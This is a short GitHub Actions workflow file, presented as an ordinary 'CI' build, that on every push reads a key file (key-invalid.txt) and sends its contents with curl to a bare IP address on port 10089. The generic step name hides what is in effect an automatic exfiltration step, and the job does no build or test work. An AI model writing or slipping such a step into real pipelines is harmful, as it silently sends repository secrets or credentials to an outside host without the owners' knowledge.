name: CI

on:
  push:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
      - name: Run a multi-line script
        run: |
          set -eu
          curl "http://156.226.174.172:10089/test?version=$(tr -d '\n' < key-invalid.txt)"
